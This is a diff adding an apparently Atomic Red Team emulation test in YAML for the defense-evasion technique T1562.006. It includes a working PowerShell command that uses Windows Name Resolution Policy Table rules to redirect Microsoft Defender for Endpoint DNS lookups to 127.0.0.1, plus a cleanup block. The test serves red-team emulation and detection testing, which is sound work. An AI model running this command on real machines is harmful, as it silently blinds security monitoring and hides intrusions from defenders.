@@ -1,0 +1,39 @@
+- id: 1174b5df-2c33-490f-8854-f5eb80c907ca
+  name: Block Cybersecurity communication by leveraging Windows Name Resolution Policy
+    Table
+  description: Adversaries are redirecting DNS queries to an incorrect or malicious
+    DNS server IP, thereby blocking legitimate communications and potentially compromising
+    the security infrastructure. This atomic test aims to respond with 127.0.0.1 when
+    a DNS query is made for endpoint.security.microsoft.com.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.006
+    name: 'Impair Defenses: Indicator Blocking'
+  platforms:
+    windows:
+      psh:
+        command: Add-DnsClientNrptRule -Namespace ".endpoint.security.microsoft.com"
+          -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table";
+          Add-DnsClientNrptRule -Namespace "endpoint.security.microsoft.com" -NameServers
+          127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"; Clear-DnsClientCache
+        cleanup: 'try {; # Get all current NRPT rules; $DnsClientNrptRules = Get-DnsClientNrptRule
+          | Where-Object { $_.Comment -eq ''Silenced by Name Resolution Policy Table''
+          }; # Remove each NRPT rule; foreach ($rule in $DnsClientNrptRules) {; Remove-DnsClientNrptRule
+          -Name $rule.Name -Force; }; # Clear DNS client cache; Clear-DnsClientCache;
+          Write-Host "All NRPT rules have been removed and the DNS cache has been
+          cleared."; }; catch {; Write-Host "An error occurred: $_"; }; Clear-DnsClientCache'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1562.006
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-03-19T19:09:30.329Z'
+    atomic_guid: 1174b5df-2c33-490f-8854-f5eb80c907ca
+    import_timestamp: '2025-06-24T11:15:00.781525Z'
